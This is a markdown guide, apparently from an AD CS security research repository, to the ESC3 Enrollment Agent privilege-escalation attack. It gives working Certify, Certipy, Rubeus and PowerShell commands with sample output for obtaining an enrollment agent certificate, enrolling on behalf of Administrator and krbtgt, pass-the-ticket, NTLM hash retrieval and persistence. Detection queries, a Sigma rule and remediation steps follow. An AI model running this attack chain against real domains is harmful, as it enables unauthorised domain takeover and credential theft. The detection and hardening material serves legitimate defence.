# ESC3 - Enrollment Agent Templates

## Attack Overview

ESC3 exploits the **Certificate Request Agent** (Enrollment Agent) functionality, which allows one certificate to be used to request certificates on behalf of other users. This is a two-step attack:

1. **Step 1**: Request an **Enrollment Agent** certificate
2. **Step 2**: Use the Enrollment Agent certificate to request a certificate on behalf of a privileged user

This was designed for help desk scenarios where administrators enroll certificates for users, but can be abused for privilege escalation.

---

## Prerequisites

- Domain user credentials
- Network access to Certificate Authority
- Access to TWO vulnerable templates:
  1. **Enrollment Agent template** - with Certificate Request Agent EKU
  2. **Client authentication template** - that allows enrollment via agent

---

## Vulnerability Conditions

### Template 1: Enrollment Agent Template
```
✓ Has "Certificate Request Agent" EKU (OID: 1.3.6.1.4.1.311.20.2.1)
✓ Low-privileged users can enroll
✓ Manager approval disabled
```

### Template 2: Target Authentication Template
```
✓ Has Client Authentication EKU
✓ Allows enrollment via Enrollment Agent
✓ Application policy requires "Certificate Request Agent"
✓ No enrollment restrictions on who agent can enroll for
```

---

## Attack Chain

### Phase 1: Enumeration

#### Using Certify
```powershell
# Find ESC3 vulnerable template pairs
.\Certify.exe find /vulnerable

# Example output
[*] Template Name: EnrollmentAgentTemplate
    Template Permissions:
      NT AUTHORITY\Authenticated Users: Enroll
    Application Policies: Certificate Request Agent
    Vulnerabilities: ESC3 - Enrollment Agent

[*] Template Name: UserAuthTemplate
    Enrollment Agent Restrictions: None
    Application Policy Required: Certificate Request Agent
    Client Authentication: Enabled
```

#### Using Certipy
```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout | grep -A 30 "ESC3"
```

#### Manual Enumeration
```powershell
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$Templates = Get-ADObject -SearchBase $TemplatesPath -Filter * -Properties *

# Find Enrollment Agent templates
$AgentTemplates = $Templates | Where-Object {
    $_.'msPKI-Certificate-Application-Policy' -contains "1.3.6.1.4.1.311.20.2.1"
}

foreach ($AgentTemplate in $AgentTemplates) {
    Write-Host "[!] Enrollment Agent Template: $($AgentTemplate.Name)" -ForegroundColor Red

    # Find templates that accept this agent
    $ClientTemplates = $Templates | Where-Object {
        $_.'msPKI-RA-Application-Policies' -contains "1.3.6.1.4.1.311.20.2.1" -and
        $_.'msPKI-Certificate-Application-Policy' -contains "1.3.6.1.5.5.7.3.2"
    }

    foreach ($ClientTemplate in $ClientTemplates) {
        Write-Host "    → Can enroll for: $($ClientTemplate.Name)" -ForegroundColor Yellow
    }
}
```

---

### Phase 2: Exploitation

#### Step 1: Request Enrollment Agent Certificate

```powershell
# Using Certify
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:EnrollmentAgentTemplate

# Save output as agent.pem
```

**Expected Output:**
```
[*] Action: Request a Certificate
[*] Template: EnrollmentAgentTemplate
[*] Subject: CN=lowprivuser, CN=Users, DC=corp, DC=local

[+] Certificate Request Successful!
-----BEGIN CERTIFICATE-----
[base64 enrollment agent certificate]
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
[base64 private key]
-----END RSA PRIVATE KEY-----
```

**Convert to PFX:**
```powershell
# Save certificate and key
$cert > agent-cert.pem
$key > agent-key.pem

# Convert to PFX
openssl pkcs12 -in agent-cert.pem -inkey agent-key.pem -export -out agent.pfx -password pass:password
```

#### Step 2: Request Certificate on Behalf of Privileged User

**Using Certify:**
```powershell
# Request certificate for Domain Admin using enrollment agent
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:UserAuthTemplate /onbehalfof:CORP\Administrator /enrollcert:agent.pfx /enrollcertpw:password

# Alternative: specify full path
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:UserAuthTemplate /onbehalfof:CORP\Administrator /enrollcert:C:\temp\agent.pfx /enrollcertpw:password
```

**Expected Output:**
```
[*] Action: Request a Certificate
[*] Using enrollment agent certificate: agent.pfx
[*] Requesting certificate on behalf of: CORP\Administrator
[*] Template: UserAuthTemplate

[+] Certificate Request Successful!
-----BEGIN CERTIFICATE-----
[base64 administrator certificate]
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
[base64 private key]
-----END RSA PRIVATE KEY-----
```

**Using Certipy:**
```bash
# Step 1: Get enrollment agent certificate
certipy req -u 'lowprivuser@corp.local' -p 'Password123' -ca 'corp-DC01-CA' -target dc01.corp.local -template EnrollmentAgentTemplate

# Step 2: Use agent cert to request on behalf of Administrator
certipy req -u 'lowprivuser@corp.local' -p 'Password123' -ca 'corp-DC01-CA' -target dc01.corp.local -template UserAuthTemplate -on-behalf-of 'CORP\Administrator' -pfx agent.pfx
```

#### Step 3: Authenticate as Privileged User

**Convert to usable PFX:**
```powershell
# Save administrator certificate
$admincert > admin-cert.pem
$adminkey > admin-key.pem

# Convert to PFX
openssl pkcs12 -in admin-cert.pem -inkey admin-key.pem -export -out administrator.pfx -password pass:password
```

**Request TGT with Rubeus:**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:password /ptt

# Verify access
klist
dir \\DC01\C$
```

**Or use Certipy to get NTLM hash:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Output includes NTLM hash
[*] Got hash for 'Administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f
```

---

### Phase 3: Advanced Exploitation

#### Enumerate All Possible Targets

```powershell
# Script to enumerate all users you can enroll for
$EnrollmentAgentCert = "agent.pfx"
$EnrollmentAgentPw = "password"

# Try high-value targets
$Targets = @(
    "Administrator",
    "Domain Admins",
    "Enterprise Admins",
    "krbtgt"
)

foreach ($Target in $Targets) {
    Write-Host "[*] Attempting to enroll for: $Target"
    .\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:UserAuthTemplate /onbehalfof:CORP\$Target /enrollcert:$EnrollmentAgentCert /enrollcertpw:$EnrollmentAgentPw
}
```

#### Persistence via Enrollment Agent

```powershell
# Keep enrollment agent certificate for long-term access
# Validity period of enrollment agent = persistence window

# Request certificates for multiple accounts
$Accounts = @("Administrator", "krbtgt", "BackupAdmin")

foreach ($Account in $Accounts) {
    .\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:UserAuthTemplate /onbehalfof:CORP\$Account /enrollcert:agent.pfx /enrollcertpw:password > "$Account-cert.txt"
}
```

---

## Detection

### Event Logs to Monitor

**Security Event 4886** - Certificate Request with Agent
```xml
EventID: 4886
Look for:
  - Template: Enrollment Agent templates
  - Requester: Non-privileged users
  - Request Type: Enrollment Agent
```

**Security Event 4887** - Certificate Issued via Agent
```xml
EventID: 4887
Look for:
  - Certificate Template: Enrollment agent templates
  - Request disposition: On behalf of another user
  - Requester != Certificate Subject (large mismatch)
```

**Custom CA Audit Log** - On Behalf Of Requests
```
Look in: C:\Windows\System32\CertSrv\CertEnroll\<CAName>.log
Pattern: "On behalf of"
```

### Detection Queries

#### Splunk - Detect ESC3 Abuse
```spl
index=windows EventCode=4887
| rex field=Message "Template:\s+(?<Template>[^\n]+)"
| rex field=Message "Requester:\s+(?<Requester>[^\n]+)"
| rex field=Message "Subject:\s+.*CN=(?<Subject>[^,]+)"
| where isnotnull(Template) AND Template="EnrollmentAgentTemplate"
| table _time, Requester, Subject, Template
```

#### KQL - Enrollment Agent Certificate Issuance
```kql
SecurityEvent
| where EventID == 4887
| extend Template = extract("Template:\\s+([^\\n]+)", 1, EventData)
| extend Requester = extract("Requester:\\s+([^\\n]+)", 1, EventData)
| extend Subject = extract("Subject:\\s+.*CN=([^,]+)", 1, EventData)
| where Template contains "Agent" or Template contains "EnrollmentAgent"
| where Requester !contains "HELPDESK" // Filter legitimate help desk
| project TimeGenerated, Requester, Subject, Template, Computer
```

#### PowerShell - Hunt for Agent Certificates
```powershell
# Query CA database for enrollment agent certificates
certutil -view -restrict "CertificateTemplate=EnrollmentAgentTemplate,Disposition=20" -out "RequesterName,CommonName,SerialNumber,NotAfter"

# Look for certificates issued on behalf of privileged accounts
certutil -view -restrict "RequestType=2" -out "RequesterName,CommonName,SerialNumber"
# RequestType=2 indicates "issued on behalf of"
```

### Sigma Rule
```yaml
title: ESC3 Enrollment Agent Certificate Request
description: Detects enrollment agent certificate requests from non-authorized users
logsource:
  product: windows
  service: security
detection:
  selection_event:
    EventID: 4886
  selection_template:
    - 'EnrollmentAgent'
    - 'Certificate Request Agent'
  filter_authorized:
    Requester|contains:
      - 'HELPDESK'
      - 'CA-ADMIN'
  condition: selection_event and selection_template and not filter_authorized
level: high
tags:
  - attack.privilege_escalation
  - attack.t1649
```

---

## Remediation

### Immediate Actions

1. **Revoke Unauthorized Enrollment Agent Certificates**
```powershell
# On CA server
certutil -view -restrict "CertificateTemplate=EnrollmentAgentTemplate" -out "SerialNumber,RequesterName,NotAfter"

# Review each certificate - revoke suspicious ones
certutil -revoke <SerialNumber> 1  # KeyCompromise
```

2. **Identify Certificates Issued via Compromised Agent**
```powershell
# Find all certificates issued using enrollment agent
certutil -view -restrict "RequestType=2" -out "RequesterName,CommonName,SerialNumber,CertificateTemplate"

# Revoke certificates issued to privileged accounts
certutil -revoke <SerialNumber> 1
```

3. **Disable Vulnerable Templates Temporarily**
```powershell
# Disable enrollment agent template
$Template = Get-ADObject -Filter {cn -eq "EnrollmentAgentTemplate"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)"
Set-ADObject $Template -Replace @{"flags"="130"}
```

---

### Long-Term Hardening

#### Configure Enrollment Agent Restrictions

**Method 1: Registry Restrictions (CA Server)**
```powershell
# Configure which templates can be used with enrollment agents
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy" /v EnrollmentAgentRights /t REG_MULTI_SZ /d "Template:UserAuthTemplate`0Agent:CORP\HelpDeskGroup`0" /f

# Restart Certificate Services
Restart-Service CertSvc
```

**Method 2: Application Policy Issuance Requirements**
```
Certificate Templates Console (certtmpl.msc):
1. Open target template (UserAuthTemplate)
2. Properties → Issuance Requirements tab
3. ☑ This number of authorized signatures: 1
4. Application policy: Certificate Request Agent
5. Click "Add" to specify allowed enrollment agents
6. Select specific enrollment agent certificates or groups
```

**Method 3: Enrollment Agent Restrictions via Policy**
```powershell
# On CA server, configure enrollment agent restrictions
certutil -setreg policy\EditFlags +EDITF_ENABLEREQUESTEXTENSIONS
certutil -setreg policy\EnableEnrollmentAgentRestrictions 1

# Restart service
net stop certsvc && net start certsvc
```

#### Restrict Enrollment Agent Template Access

```powershell
# Remove broad enrollment permissions
# Certificate Templates Console:
# EnrollmentAgentTemplate → Properties → Security

# Remove:
#   - Authenticated Users
#   - Domain Users

# Add specific group:
#   - HelpDesk-CertEnrollment (custom group)
#   - Permissions: Read, Enroll
```

#### Enable Manager Approval

```powershell
# Require manual approval for enrollment agent certificates
# Template Properties → Issuance Requirements
# ☑ CA certificate manager approval
```

#### Implement Issuance Policies

```powershell
# Create issuance policy for enrollment agents
# Define who can request certificates on behalf of others
# Enforce through CA policy modules
```

---

## Prevention Best Practices

### Enrollment Agent Security Framework

```yaml
Enrollment Agent Best Practices:

Access Control:
  - Dedicated security group for enrollment agents
  - Named enrollment agent accounts (not generic users)
  - Regular access reviews
  - Multi-factor authentication required

Template Configuration:
  - Explicit enrollment agent restrictions configured
  - Limited templates available for agent use
  - Separate templates for different privilege levels
  - Short validity periods (≤ 6 months)

Monitoring:
  - All enrollment agent requests logged
  - Alerts on privileged account enrollment
  - Regular audit of issued certificates
  - Anomaly detection on enrollment patterns

Restrictions:
  - Enrollment agents cannot enroll for:
    - Domain Admins
    - Enterprise Admins
    - Service Accounts
    - Other enrollment agents
```

### Configuration Checklist

- [ ] Enrollment agent template restricted to specific group
- [ ] Manager approval enabled for enrollment agent template
- [ ] Enrollment agent restrictions configured on CA
- [ ] Target templates specify allowed enrollment agents
- [ ] Privileged accounts excluded from agent enrollment
- [ ] Monitoring and alerting configured
- [ ] Regular audits of enrollment agent usage
- [ ] MFA required for enrollment agent accounts

---

## Tools and Scripts

### Enumeration
```powershell
# .\scripts\enumeration\Find-ESC3.ps1
# Identifies enrollment agent templates and vulnerable pairings
```

### Exploitation
```powershell
# .\scripts\exploitation\Exploit-ESC3.ps1
# Automated ESC3 attack chain
```

### Defense
```powershell
# .\scripts\defense\Configure-EnrollmentAgentRestrictions.ps1
# Implements enrollment agent restrictions
```

---

## References

- [SpecterOps - Certified Pre-Owned (ESC3)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Microsoft - Restrict Enrollment Agents](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786443(v=ws.11))
- [Certify - Enrollment Agent Abuse](https://github.com/GhostPack/Certify)

---

**Author**: ADCS Attack Research
**Last Updated**: November 2025
**Classification**: Authorized Security Testing Only
